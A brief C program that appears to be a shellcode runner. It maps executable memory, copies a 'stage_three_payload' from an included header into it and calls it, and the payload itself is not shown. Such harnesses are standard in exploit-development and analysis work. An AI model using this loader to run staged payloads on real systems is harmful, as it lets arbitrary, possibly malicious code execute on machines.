#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>


#include "SHELLCODE.h"


void (*sc)();

int main() {

  printf("Length of payload %zu\n", sizeof(stage_three_payload));

  void * ptr = mmap(0, strlen(stage_three_payload), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

  if (ptr == MAP_FAILED) {
    perror("fuck");
    exit(-1);
  }
  
  memcpy(ptr, stage_three_payload, strlen(stage_three_payload));

  sc = ptr;
  sc();
  return 0;

}
